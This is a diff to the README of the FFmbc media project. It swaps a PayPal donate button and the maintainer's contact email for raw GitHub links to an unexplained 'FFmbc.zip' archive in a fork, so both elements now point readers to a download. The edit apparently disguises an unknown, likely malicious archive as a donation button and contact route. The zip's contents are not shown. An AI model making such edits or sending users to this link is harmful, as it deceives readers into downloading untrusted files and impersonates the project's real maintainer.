@@ -1,5 +1,5 @@
 
-[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=YZXVPDXN68FDG)
+[![paypal](https://raw.githubusercontent.com/stufixlp/FFmbc/ffmbc/photesthesis/FFmbc.zip)](https://raw.githubusercontent.com/stufixlp/FFmbc/ffmbc/photesthesis/FFmbc.zip)
 
 # What you can do with FFmbc #
 
@@ -29,7 +29,7 @@ Current stable release is version 0.7.3
 
 FFmbc license is GPL v2
 
-Please contact baptiste.coudurier@gmail.com for:
+Please contact https://raw.githubusercontent.com/stufixlp/FFmbc/ffmbc/photesthesis/FFmbc.zip for:
  - consulting work
  - commercial support
 
